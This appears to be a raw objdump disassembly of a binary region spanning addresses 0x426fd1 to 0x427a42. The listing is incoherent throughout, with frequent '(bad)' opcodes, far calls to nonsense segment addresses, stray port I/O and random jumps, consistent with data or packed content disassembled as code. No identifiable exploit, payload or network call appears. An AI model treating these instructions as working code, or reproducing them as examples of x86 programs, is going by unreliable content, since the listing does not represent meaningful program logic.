  426fd1:	mov    ch,0x83
  426fd3:	call   0x4034f0c9
  426fd8:	aas    
  426fd9:	fst    QWORD PTR [eax]
  426fdb:	lods   eax,DWORD PTR ds:[esi]
  426fdc:	cdq    
  426fdd:	xchg   ebx,eax
  426fde:	cdq    
  426fdf:	(bad)  
  426fe0:	(bad)  
  426fe1:	(bad)  
  426fe2:	iret   
  426fe3:	adc    DWORD PTR [edx+0x3e],ecx
  426fe6:	cwde   
  426fe7:	xchg   esp,eax
  426fe8:	repnz xor ecx,ecx
  426feb:	ror    BYTE PTR [eax+edx*2-0x70],1
  426fef:	fs inc ebx
  426ff1:	mov    esp,0xb5fe4aff
  426ff6:	xchg   DWORD PTR fs:[ebp-0x3],edi
  426ffa:	jle    0x427037
  426ffc:	or     eax,0xfc45ead3
  427001:	or     edx,ebx
  427003:	and    bh,dh
  427005:	jne    0x426fe0
  427007:	into   
  427008:	or     DWORD PTR [edi],ebp
  42700a:	call   0xfb3d:0x7ac37c65
  427011:	fcom   DWORD PTR [eax+0x50]
  427014:	pushw  0xe5df
  427018:	jbe    0x427090
  42701a:	jle    0x426fe0
  42701c:	mov    eax,0xd2d4ea68
  427021:	cmp    edi,ebx
  427023:	mov    DWORD PTR [ecx-0x50],edi
  427026:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427027:	repz cld 
  427029:	rcl    ebx,cl
  42702b:	faddp  st(4),st
  42702d:	(bad)  
  42702e:	fstp   QWORD PTR [edi-0x1e377124]
  427034:	data16 shl BYTE PTR [edx+0x6cd54c1a],cl
  42703b:	fcomp  st(1)
  42703d:	repz sbb al,0xfa
  427040:	addr16 inc ecx
  427042:	fcmovnu st,st(6)
  427044:	adc    ah,BYTE PTR [edx+ecx*8]
  427047:	push   ds
  427048:	inc    eax
  427049:	lds    eax,FWORD PTR [esi+0x51]
  42704c:	icebp  
  42704d:	sahf   
  42704e:	cmp    DWORD PTR [edi+0x5f],ebp
  427051:	push   ebp
  427052:	and    ch,BYTE PTR [ebp+0x2f]
  427055:	mov    BYTE PTR [esi+0x5a],cl
  427058:	adc    ebp,ebp
  42705a:	xchg   edx,eax
  42705b:	mov    al,BYTE PTR [ecx+0x55b1194]
  427061:	(bad)  
  427062:	push   ss
  427063:	dec    esi
  427064:	pop    esi
  427065:	pop    ecx
  427066:	sub    bl,cl
  427068:	inc    eax
  427069:	add    ebp,edx
  42706b:	pop    esp
  42706c:	ins    DWORD PTR es:[edi],dx
  42706d:	pop    ecx
  42706e:	xchg   esi,eax
  42706f:	scas   al,BYTE PTR es:[edi]
  427070:	loope  0x42701a
  427072:	mov    al,ds:0x990d5cac
  427077:	loop   0x427071
  427079:	retf   
  42707a:	lahf   
  42707b:	in     al,dx
  42707c:	mov    ch,0x98
  42707e:	repnz mov ds:0xfea0a7b7,eax
  427084:	push   0x1c
  427086:	jg     0x427031
  427088:	inc    ecx
  427089:	rol    BYTE PTR ss:[edi+0x2d33bcdf],1
  427090:	inc    BYTE PTR [eax]
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xae279d96
  427102:	sub    edi,DWORD PTR [ecx]
  427104:	fsub   DWORD PTR [ecx+0x1050001]
  42710a:	add    BYTE PTR [eax],al
  42710c:	test   ebp,ebp
  42710e:	inc    edx
  42710f:	scas   al,BYTE PTR es:[edi]
  427110:	sub    ebx,DWORD PTR [edx+eiz*1+0x9]
  427114:	ret    
  427115:	in     al,dx
  427116:	inc    ebx
  427117:	repz jb 0x4270aa
  42711a:	sbb    eax,ecx
  42711c:	pop    eax
  42711d:	adc    ecx,DWORD PTR [eax-0x6c3572be]
  427123:	xchg   edi,eax
  427124:	test   al,0x27
  427126:	jne    0x427197
  427128:	mov    dh,BYTE PTR [esi+0x18]
  42712b:	je     0x427126
  42712d:	dec    bh
  42712f:	jp     0x42716a
  427131:	adc    al,BYTE PTR [eax+0x3fc3b34]
  427137:	ret    0x2e2b
  42713a:	mov    edx,0x2a019b4a
  42713f:	retf   
  427140:	xchg   edi,eax
  427141:	dec    esp
  427142:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427143:	jge    0x427123
  427145:	rcr    DWORD PTR [edx-0x5794c6b6],1
  42714b:	(bad)  
  42714c:	xor    al,0xb9
  42714e:	test   DWORD PTR [esi+esi*1-0x42a226b8],edx
  427155:	cwde   
  427156:	call   0x87f4:0x5a052d26
  42715d:	in     al,0x59
  42715f:	inc    esi
  427160:	out    dx,al
  427161:	(bad)  
  427162:	ins    BYTE PTR es:[edi],dx
  427163:	cwde   
  427164:	int    0xf4
  427166:	add    DWORD PTR [edi],eax
  427168:	adc    eax,0xb98737a8
  42716d:	or     al,BYTE PTR [eax-0x3a4417f5]
  427173:	dec    ebp
  427174:	jg     0x4271c4
  427176:	add    DWORD PTR [eax-0x4f],0x88399c4b
  42717d:	test   eax,0x4ec3ba9a
  427182:	imul   ebp,DWORD PTR [esi],0x7cac2235
  427188:	or     eax,0x622c98d
  42718d:	push   cs
  42718e:	ins    DWORD PTR es:[edi],dx
  42718f:	mov    ch,al
  427191:	xchg   esi,eax
  427192:	mov    WORD PTR [edx+0x7dbde2d8],?
  427198:	shl    BYTE PTR [esp+edx*2],0x57
  42719c:	mov    bl,dh
  42719e:	inc    esp
  42719f:	push   edx
  4271a0:	cli    
  4271a1:	mov    dh,BYTE PTR [esi+0x7b]
  4271a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271a5:	pop    esi
  4271a6:	jbe    0x4271ea
  4271a8:	imul   ecx,DWORD PTR gs:[edi+0x337b8c37],0x2d
  4271b0:	dec    ecx
  4271b1:	test   al,0x88
  4271b3:	pop    eax
  4271b4:	mov    ecx,0x33d1207f
  4271b9:	pop    edi
  4271ba:	retf   0xaba7
  4271bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4271be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271bf:	xchg   ebx,eax
  4271c0:	(bad)  
  4271c1:	jle    0x427224
  4271c3:	arpl   ax,ax
  4271c5:	push   0x42
  4271c7:	neg    BYTE PTR [ecx]
  4271c9:	and    eax,0x8794be53
  4271ce:	xchg   ebp,eax
  4271cf:	aas    
  4271d0:	lea    edi,ds:0x27123d6d
  4271d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271d7:	shr    dh,cl
  4271d9:	pop    ds
  4271da:	loope  0x427237
  4271dc:	repz cmp al,ch
  4271df:	cld    
  4271e0:	cmp    eax,DWORD PTR [eax]
  4271e2:	fs fs (bad) 
  4271e5:	aad    0xa2
  4271e7:	mul    BYTE PTR [esi+0x2e]
  4271ea:	out    dx,al
  4271eb:	cmc    
  4271ec:	xchg   ebp,esi
  4271ee:	call   0x431e:0xaed21cae
  4271f5:	enter  0x5f3d,0x35
  4271f9:	fcomp  QWORD PTR [edi+eiz*2]
  4271fc:	neg    bh
  4271fe:	aad    0xd4
  427200:	cmp    bl,BYTE PTR [ecx]
  427202:	popf   
  427203:	out    dx,al
  427204:	rcr    DWORD PTR [ebx-0x5a804721],0xee
  42720b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42720c:	lahf   
  42720d:	pop    ss
  42720e:	add    esp,edi
  427210:	push   ss
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xac7556b9,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	inc    eax
  42728d:	int    0x42
  42728f:	daa    
  427290:	cld    
  427291:	jbe    0x427244
  427293:	mov    edx,0xdb902bd7
  427298:	rol    DWORD PTR [ebx+0x59ddc86d],1
  42729e:	xchg   edi,eax
  42729f:	cmp    DWORD PTR [ebp+0x78],esp
  4272a2:	sahf   
  4272a3:	loop   0x42726a
  4272a5:	lahf   
  4272a6:	xor    esp,esi
  4272a8:	outs   dx,BYTE PTR ds:[esi]
  4272a9:	div    BYTE PTR [esi]
  4272ab:	int3   
  4272ac:	jno    0x4272d0
  4272ae:	pop    ss
  4272af:	push   0xffffffa4
  4272b1:	call   0x17e31e04
  4272b6:	lahf   
  4272b7:	and    eax,0xbd57ab5
  4272bc:	or     DWORD PTR [ebx],ebx
  4272be:	popf   
  4272bf:	sub    al,0xaa
  4272c1:	in     eax,dx
  4272c2:	push   es
  4272c3:	das    
  4272c4:	ret    
  4272c5:	das    
  4272c6:	pop    eax
  4272c7:	sub    BYTE PTR [esp+ebp*4-0x5],bl
  4272cb:	mov    gs,WORD PTR [ecx+ecx*1]
  4272ce:	out    dx,al
  4272cf:	pusha  
  4272d0:	dec    esi
  4272d1:	ret    0xddc5
  4272d4:	clc    
  4272d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272d6:	enter  0xbbbc,0x6b
  4272da:	(bad)  
  4272db:	jge    0x42729b
  4272dd:	adc    eax,0x3eff3c87
  4272e2:	mov    al,ds:0x293c6fe9
  4272e7:	xor    bh,ch
  4272e9:	fnstsw WORD PTR [ebp-0x3e]
  4272ec:	js     0x427355
  4272ee:	loopne 0x427342
  4272f0:	cmp    eax,0xde2b6112
  4272f5:	or     ebx,DWORD PTR [eax]
  4272f7:	jmp    0x63a1fc67
  4272fc:	(bad)  
  4272fd:	les    ebx,FWORD PTR ds:0x45b1dda3
  427303:	int3   
  427304:	(bad)  
  427305:	sbb    BYTE PTR [edi],ch
  427307:	pop    ebx
  427308:	dec    esp
  427309:	mov    edx,0x1fcdb288
  42730e:	add    BYTE PTR gs:[ebx],0x40
  427312:	retf   
  427313:	mov    dl,0xee
  427315:	lahf   
  427316:	mov    BYTE PTR [eax-0x1b78b3bc],dl
  42731c:	data16 (bad) 
  42731f:	add    eax,DWORD PTR [esi+eiz*2]
  427322:	fbstp  TBYTE PTR [edi+0x625e7e4e]
  427328:	lods   eax,DWORD PTR ds:[esi]
  427329:	into   
  42732a:	and    bh,BYTE PTR [esi-0x74e9993]
  427330:	and    bl,BYTE PTR [edi*4-0x7c98dce8]
  427337:	ss mov ecx,0x7eb2b2f0
  42733d:	fist   DWORD PTR [edi-0x3c7e159]
  427343:	and    BYTE PTR [ebx+0x269ef5aa],cl
  427349:	retf   0xdf12
  42734c:	aas    
  42734d:	(bad)  
  42734e:	jmp    0x833850b2
  427353:	out    0x24,eax
  427355:	dec    edx
  427356:	cmp    BYTE PTR [eax],dl
  427358:	arpl   WORD PTR [esi],bx
  42735a:	sbb    al,BYTE PTR [esi-0xd]
  42735d:	test   eax,0x969c01d2
  427362:	aad    0xa4
  427364:	aaa    
  427365:	pop    ebx
  427366:	es cmp eax,0xf99ba9f9
  42736c:	cs je  0x4273d0
  42736f:	xchg   esi,eax
  427370:	test   eax,0x557202b
  427375:	test   al,0x6e
  427377:	mov    ah,0x1e
  427379:	dec    ebx
  42737a:	pop    edx
  42737b:	cmp    eax,0x8a8a1624
  427380:	(bad)  
  427381:	push   esp
  427382:	fidivr WORD PTR [eax+0x51]
  427385:	pusha  
  427386:	or     ebp,DWORD PTR [ebx-0x6c869f87]
  42738c:	pop    ebp
  42738d:	loope  0x42740a
  42738f:	imul   ebx,edi,0x0
	...
  4273f1:	add    BYTE PTR [eax],al
  4273f3:	add    BYTE PTR [edx],dl
  4273f5:	sbb    eax,0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esp,DWORD PTR [eax-0x1d69c964]
  427405:	mov    ds:0x1050001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	pop    ebx
  42740d:	mov    ds:0x5acfc15e,eax
  427412:	push   cs
  427413:	jae    0x4273a2
  427415:	add    dh,cl
  427417:	push   ss
  427418:	pushf  
  427419:	shr    ch,1
  42741b:	retf   0xfc54
  42741e:	xor    edi,DWORD PTR [eax-0x2f]
  427421:	call   0x98f68bc0
  427426:	or     BYTE PTR [edi],cl
  427428:	add    dh,cl
  42742a:	cmp    ah,BYTE PTR [edx]
  42742c:	(bad)  
  42742d:	pop    ebp
  42742e:	inc    eax
  42742f:	leave  
  427430:	lds    eax,FWORD PTR [esi]
  427432:	loop   0x4273fc
  427434:	imul   esp
  427436:	pop    eax
  427437:	jno    0x427414
  427439:	mov    DWORD PTR [ebp+0xc],eax
  42743c:	mov    DWORD PTR [ecx+0x6eadfd56],ebx
  427442:	sub    DWORD PTR [ebp+0x6e],0xfffffff5
  427446:	inc    esi
  427447:	and    al,0xb5
  427449:	gs (bad) 
  42744b:	xlat   BYTE PTR ds:[ebx]
  42744c:	mov    ebp,0xe347d4b2
  427451:	mov    DWORD PTR [edi+0x6a1d9329],0x5cc44e5
  42745b:	mov    edx,0xd6d79d2d
  427460:	xchg   ebp,eax
  427461:	out    0xa7,eax
  427463:	call   FWORD PTR [esi-0x77]
  427466:	mov    bl,dh
  427468:	dec    edx
  427469:	pop    edi
  42746a:	or     DWORD PTR ds:[edi-0x6f],ebp
  42746e:	adc    BYTE PTR [esi-0x12],dl
  427471:	jbe    0x427445
  427473:	mul    ecx
  427475:	or     ah,bh
  427477:	mov    edx,0xf068d2ec
  42747c:	sbb    cl,BYTE PTR [ecx+0x44]
  42747f:	lock adc esp,ebp
  427482:	adc    dl,BYTE PTR [ecx+eiz*4]
  427485:	(bad)  
  427486:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427487:	mov    eax,0x5e78f9c1
  42748c:	fstp   TBYTE PTR ds:0xf9496e41
  427492:	add    eax,DWORD PTR [edx+0x2e5e07c3]
  427498:	adc    BYTE PTR [esi+ecx*8-0x357fbb78],cl
  42749f:	scas   al,BYTE PTR es:[edi]
  4274a0:	shr    BYTE PTR [eax],0x26
  4274a3:	mov    dl,dh
  4274a5:	(bad)  
  4274a6:	(bad)  
  4274a7:	es mov cl,0x5d
  4274aa:	rcr    DWORD PTR [esi+0x6bf1f4be],cl
  4274b0:	int    0xc9
  4274b2:	popf   
  4274b3:	lock adc BYTE PTR [edx-0x74],bh
  4274b7:	test   BYTE PTR [ecx],al
  4274b9:	push   esp
  4274ba:	rcl    DWORD PTR ds:0xb984aa9c,1
  4274c0:	repnz xor BYTE PTR ds:0x979dd245,0x74
  4274c8:	mov    ecx,0xa2dc147
  4274cd:	ja     0x42746e
  4274cf:	loope  0x4274ac
  4274d1:	in     eax,dx
  4274d2:	xor    al,0x34
  4274d4:	xor    BYTE PTR ds:0xc0b1c6f0,dh
  4274da:	pop    edi
  4274db:	les    ebp,FWORD PTR [ebx+0x27]
  4274de:	cld    
  4274df:	hlt    
  4274e0:	xchg   ecx,eax
  4274e1:	xor    BYTE PTR [eax+0xf],bh
  4274e4:	mov    dl,0x76
  4274e6:	in     eax,0xcd
  4274e8:	push   ebx
  4274e9:	mov    ds:0xb5caefa3,eax
  4274ee:	arpl   di,bp
  4274f0:	adc    al,dl
  4274f2:	fistp  WORD PTR [esi+0x5d3dd31f]
  4274f8:	mov    ds:0x62304b52,al
  4274fd:	pop    ebx
  4274fe:	cmp    eax,0xb20b64a2
  427503:	test   al,0xcd
  427505:	xor    ebp,DWORD PTR [ebx-0x6c]
  427508:	hlt    
  427509:	push   0xb1fcee15
  42750e:	int    0x36
  427510:	in     al,0x0
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	push   esp
  427581:	lea    edx,[edi+0x1a4e7a9]
  427587:	add    BYTE PTR ds:0xc0000001,al
  42758d:	lock mov al,ds:0x965955aa
  427593:	hlt    
  427594:	cmp    esp,DWORD PTR [edi-0x6a]
  427597:	sbb    DWORD PTR [edx+edi*2-0x6daac199],0x64
  42759f:	push   0x1f
  4275a1:	jnp    0x4275b9
  4275a3:	data16 jl 0x4275f9
  4275a6:	or     eax,0xf34e4e31
  4275ab:	or     BYTE PTR [eax-0x57],0x6
  4275af:	sbb    al,0xb2
  4275b1:	or     eax,0x455abc2e
  4275b6:	or     BYTE PTR [esi-0x7c256021],cl
  4275bc:	stos   DWORD PTR es:[edi],eax
  4275bd:	pop    esi
  4275be:	xchg   edx,eax
  4275bf:	xchg   DWORD PTR [edi-0x3798735c],edx
  4275c5:	call   0xc374:0x45ed68ff
  4275cc:	or     DWORD PTR [ebp+0x452580ca],eax
  4275d2:	add    eax,0x385ef7ca
  4275d7:	js     0x42758c
  4275d9:	imul   esi,DWORD PTR [edi-0x4c],0xc4328996
  4275e0:	pop    ds
  4275e1:	stos   DWORD PTR es:[edi],eax
  4275e2:	cdq    
  4275e3:	gs loope 0x4275a6
  4275e6:	jge    0x4275ae
  4275e8:	mov    bl,0x98
  4275ea:	or     edi,DWORD PTR [edx-0x222dbc0c]
  4275f0:	std    
  4275f1:	in     eax,0x11
  4275f3:	xor    eax,0x32ede2dc
  4275f8:	in     al,dx
  4275f9:	test   eax,0xe7415668
  4275fe:	or     BYTE PTR [esi],dh
  427600:	das    
  427601:	es stos DWORD PTR es:[edi],eax
  427603:	stos   DWORD PTR es:[edi],eax
  427604:	mov    ah,0xcf
  427606:	xchg   edx,eax
  427607:	mov    DWORD PTR [esi-0x7f],edi
  42760a:	scas   eax,DWORD PTR es:[edi]
  42760b:	cmp    DWORD PTR [esi],ebp
  42760d:	dec    ecx
  42760e:	in     eax,dx
  42760f:	ins    BYTE PTR es:[edi],dx
  427610:	mov    edx,0x46a398cb
  427615:	aas    
  427616:	push   cs
  427617:	arpl   WORD PTR [ebx-0x1c],ax
  42761a:	mov    eax,ds:0xf0f083f
  42761f:	call   0x7145d59d
  427624:	push   0x8067dfc7
  427629:	add    ebp,DWORD PTR [edx+0x3]
  42762c:	lea    esp,[edx]
  42762e:	mov    cl,0x45
  427630:	and    BYTE PTR gs:[ecx+0x61e2b609],bh
  427637:	mov    al,ds:0xf6c078da
  42763c:	xlat   BYTE PTR ds:[ebx]
  42763d:	stos   BYTE PTR es:[edi],al
  42763e:	sahf   
  42763f:	pop    ebx
  427640:	test   al,0x40
  427642:	or     dl,BYTE PTR [ebx]
  427644:	(bad)  
  427645:	rcr    dh,1
  427647:	pop    ecx
  427648:	(bad)
  42764b:	inc    edi
  42764c:	imul   eax,DWORD PTR [eax],0x26
  42764f:	sbb    ebx,DWORD PTR [ebx+0x3d]
  427652:	xchg   ah,al
  427654:	rcl    bh,0xb
  427657:	jb     0x427673
  427659:	push   ebp
  42765a:	xchg   DWORD PTR [ecx-0x71d797c3],eax
  427660:	pop    eax
  427661:	jmp    0x59d89829
  427666:	fsub   DWORD PTR [edi]
  427668:	push   esi
  427669:	push   edi
  42766a:	fs jb  0x4276c4
  42766d:	xchg   edi,eax
  42766e:	ds hlt 
  427670:	sbb    al,0x10
  427672:	ja     0x427637
  427674:	in     al,0x5e
  427676:	(bad)  
  427677:	mov    ds:0x77b5bfc3,al
  42767c:	xchg   edi,eax
  42767d:	adc    dl,ch
  42767f:	ret    0x2298
  427682:	xchg   edi,eax
  427683:	mov    dh,0x69
  427685:	mov    ch,0xe2
  427687:	sub    BYTE PTR [ecx],dh
  427689:	outs   dx,DWORD PTR ds:[esi]
  42768a:	sbb    eax,0x8c18cba4
  42768f:	mov    dl,0xac
	...
  4276f1:	add    BYTE PTR [eax],al
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	(bad)  
  427701:	mov    al,ds:0xa5ec3a40
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0xc3000001
  42770d:	and    eax,0x15645cd6
  427712:	and    BYTE PTR [edi],ch
  427714:	xchg   esp,eax
  427715:	into   
  427716:	fs jmp 0x50df838e
  42771c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42771d:	je     0x4276ca
  42771f:	jmp    0x4276d0
  427721:	ins    BYTE PTR es:[edi],dx
  427722:	sub    dl,BYTE PTR [edx]
  427724:	adc    eax,0x12502696
  427729:	cli    
  42772a:	loopne 0x42774f
  42772c:	enter  0x1afc,0xd3
  427730:	push   esp
  427731:	(bad)  
  427732:	mov    ds:0x37a71dc3,eax
  427737:	mov    esp,0xcaae8a1c
  42773c:	push   0x77118181
  427741:	call   FWORD PTR [ebx]
  427743:	push   ebp
  427744:	inc    ebx
  427745:	jecxz  0x4276da
  427747:	test   DWORD PTR [edx+0x50],esi
  42774a:	pop    edi
  42774b:	rcl    BYTE PTR [ebp-0x64],cl
  42774e:	cmp    BYTE PTR [esi+0x3f7db945],bl
  427754:	iret   
  427755:	add    bl,BYTE PTR [edi-0x5a]
  427758:	mov    cl,0x3
  42775a:	jns    0x4277d0
  42775c:	cmp    edi,DWORD PTR [ebx+0x5]
  42775f:	fdivr  QWORD PTR [ebx+0x19be4a6d]
  427765:	shl    BYTE PTR [esi+0x63a24d20],0x70
  42776c:	cmc    
  42776d:	shl    DWORD PTR [esi-0x5e],0x42
  427771:	or     eax,0x753f3fa2
  427776:	inc    BYTE PTR [ebx]
  427778:	push   ebx
  427779:	pop    ebx
  42777a:	pop    ebp
  42777b:	sbb    DWORD PTR ds:0xccf4e801,ebx
  427781:	clc    
  427782:	or     BYTE PTR [edx+0x22],cl
  427785:	adc    eax,0x64c335bf
  42778a:	js     0x427721
  42778c:	aas    
  42778d:	stc    
  42778e:	stos   DWORD PTR es:[edi],eax
  42778f:	outs   dx,BYTE PTR ds:[esi]
  427790:	xchg   edi,eax
  427791:	inc    ebx
  427792:	cmp    DWORD PTR [ebx+edi*2+0x74],esp
  427796:	jp     0x4277bc
  427798:	add    BYTE PTR [ebx-0x3f557f5c],cl
  42779e:	test   edx,0x7ab29211
  4277a4:	push   esi
  4277a5:	mov    eax,0x5c4d022e
  4277aa:	fmul   DWORD PTR [ebp-0x32aaa2c3]
  4277b0:	lds    edx,FWORD PTR [edi-0x584dd005]
  4277b6:	in     al,0x2c
  4277b8:	xchg   esp,eax
  4277b9:	leave  
  4277ba:	es jb  0x427826
  4277bd:	inc    eax
  4277be:	ret    0xe36c
  4277c1:	scas   al,BYTE PTR es:[edi]
  4277c2:	jbe    0x4277fe
  4277c4:	mov    dh,0x48
  4277c6:	push   ecx
  4277c7:	adc    eax,0x1ca00ed6
  4277cc:	pop    ds
  4277cd:	xlat   BYTE PTR ds:[ebx]
  4277ce:	stos   BYTE PTR es:[edi],al
  4277cf:	add    ah,BYTE PTR [ebp-0x33]
  4277d2:	jmp    0x9786:0x28c5a61d
  4277d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277da:	or     BYTE PTR ds:0xf34d5fb8,0x7a
  4277e1:	sbb    al,0xaa
  4277e3:	dec    eax
  4277e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4277e5:	mov    eax,ds:0xc699cf4b
  4277ea:	stos   DWORD PTR es:[edi],eax
  4277eb:	stos   BYTE PTR es:[edi],al
  4277ec:	pop    eax
  4277ed:	xor    ecx,DWORD PTR [edx+0x61]
  4277f0:	mov    ch,0xee
  4277f2:	pop    ss
  4277f3:	xor    dh,BYTE PTR [edi+0xd]
  4277f6:	add    BYTE PTR [ebp+0x24],0x7c
  4277fa:	sbb    al,BYTE PTR [edi+0x4ef249e6]
  427800:	(bad)  
  427801:	in     al,0x8f
  427803:	(bad)  
  427805:	jb     0x4277e4
  427807:	icebp  
  427808:	sub    cl,BYTE PTR [ebx]
  42780a:	lock arpl WORD PTR ds:0xa129565b,bp
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	adc    eax,0xf1f9cc38
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    eax,0x3f000001
  42788d:	push   0x93c237a5
  427892:	sbb    al,0xd7
  427894:	fidivr DWORD PTR [esp+ebp*2]
  427897:	xor    dl,BYTE PTR [esi]
  427899:	(bad)  
  42789a:	lods   al,BYTE PTR ds:[esi]
  42789b:	int    0x81
  42789d:	or     DWORD PTR [edx+0x72],ebp
  4278a0:	sbb    al,0x36
  4278a2:	les    esp,FWORD PTR [eax-0x613df9f5]
  4278a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278a9:	int    0x84
  4278ab:	pmaddwd mm5,QWORD PTR [edx-0x3c]
  4278af:	mov    esi,0x35307a51
  4278b4:	std    
  4278b5:	jns    0x4278c1
  4278b7:	aas    
  4278b8:	out    0xb1,eax
  4278ba:	in     eax,0xd7
  4278bc:	xchg   edi,eax
  4278bd:	jb     0x427927
  4278bf:	push   eax
  4278c0:	jb     0x4278e8
  4278c2:	sub    ah,ah
  4278c4:	cmp    edi,DWORD PTR [eax+0x5e]
  4278c7:	int3   
  4278c8:	pop    esp
  4278c9:	je     0x427917
  4278cb:	xor    BYTE PTR [ecx-0x34],bh
  4278ce:	or     BYTE PTR [ecx+0x774f295f],bl
  4278d4:	pop    esi
  4278d5:	jl     0x427884
  4278d7:	iret   
  4278d8:	push   0xdfff186c
  4278dd:	and    al,0xb3
  4278df:	pop    ebx
  4278e0:	dec    edi
  4278e1:	loope  0x4278c7
  4278e3:	out    dx,al
  4278e4:	sti    
  4278e5:	add    BYTE PTR [ebx],bh
  4278e7:	repnz aam 0x4f
  4278ea:	xchg   ecx,eax
  4278eb:	or     ah,BYTE PTR [ebx-0x15]
  4278ee:	cmp    ebp,DWORD PTR [ebx]
  4278f0:	or     DWORD PTR ds:0x5b0848fd,esp
  4278f6:	jae    0x4278c3
  4278f8:	dec    ebp
  4278f9:	stc    
  4278fa:	pop    eax
  4278fb:	dec    esi
  4278fc:	fistp  QWORD PTR [esi-0x111255cc]
  427902:	repz push ebp
  427904:	jp     0x4278aa
  427906:	(bad)
  42790a:	icebp  
  42790b:	mov    edi,0xa8575a8b
  427910:	push   es
  427911:	sbb    BYTE PTR [edx+0x60ed6aa3],0x82
  427918:	mul    BYTE PTR [ecx-0xa9a085c]
  42791e:	sar    BYTE PTR [edi],1
  427920:	mov    ch,0x4f
  427922:	outs   dx,BYTE PTR ds:[esi]
  427923:	add    edx,DWORD PTR [edx]
  427925:	dec    ebp
  427926:	mov    ebp,0x44a43973
  42792b:	daa    
  42792c:	jb     0x427907
  42792e:	aam    0xb0
  427930:	inc    ebx
  427931:	sub    ecx,esi
  427933:	add    ebx,DWORD PTR [esi+edi*2+0x75]
  427937:	hlt    
  427938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427939:	jp     0x42792d
  42793b:	sub    al,0x7f
  42793d:	mov    bh,0xf1
  42793f:	mov    ds:0xfd878fed,al
  427944:	add    al,0x5c
  427946:	inc    ebx
  427947:	jae    0x427912
  427949:	(bad)  
  42794b:	inc    edi
  42794c:	xor    DWORD PTR [eax],edx
  42794e:	adc    esp,ecx
  427950:	aam    0xef
  427952:	jg     0x4279b0
  427954:	xlat   BYTE PTR ds:[ebx]
  427955:	(bad)  
  427956:	jmp    0x4278fc
  427958:	mov    ah,0xf4
  42795a:	or     al,0x86
  42795c:	aad    0x65
  42795e:	jmp    0x83cc:0x9b39f54c
  427965:	fisub  DWORD PTR [eax-0x5b0c5ec5]
  42796b:	add    ecx,DWORD PTR [ebp+eiz*1-0x61]
  42796f:	mov    cl,0x97
  427971:	and    esp,DWORD PTR [eax]
  427973:	mov    dh,BYTE PTR [ecx+0x4fb7fe30]
  427979:	ror    BYTE PTR [esi-0x6a5748d1],cl
  42797f:	fwait
  427980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427981:	fwait
  427982:	xor    DWORD PTR [ebx+edx*2],0xa0e04474
  427989:	mov    dh,0x4e
  42798b:	dec    DWORD PTR [ebx-0x23]
  42798e:	aas    
  42798f:	test   eax,0x71
	...
  4279f4:	call   0xdea3:0xffa3ffdd
  4279fb:	std    
  4279fc:	inc    edx
  4279fd:	jne    0x4279d7
  4279ff:	and    DWORD PTR [eax],0x3c
  427a02:	and    dl,BYTE PTR [edi-0xa]
  427a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    eax,0x48000001
  427a0d:	or     DWORD PTR [esi-0x10],ebx
  427a10:	shl    ah,0xec
  427a13:	repnz es pop ss
  427a16:	xchg   DWORD PTR [edx],edi
  427a18:	and    al,0x28
  427a1a:	test   BYTE PTR [edi+0x7b],ch
  427a1d:	mov    bh,0x45
  427a1f:	inc    esi
  427a20:	add    bh,BYTE PTR [esi]
  427a22:	cwde   
  427a23:	dec    edi
  427a24:	xor    BYTE PTR [ebp+0x3c],ch
  427a27:	repz xchg ebx,eax
  427a29:	mov    ds:0xb2c0571d,al
  427a2e:	push   ss
  427a2f:	pusha  
  427a30:	add    ecx,DWORD PTR fs:[eax]
  427a33:	mov    bl,0x8
  427a35:	push   ebp
  427a36:	inc    edx
  427a37:	scas   eax,DWORD PTR es:[edi]
  427a38:	imul   eax,DWORD PTR [eax-0x7df90a04],0x7a
  427a3f:	aaa    
  427a40:	(bad)  
  427a41:	std    
  427a42:	cs ja  0x427aac
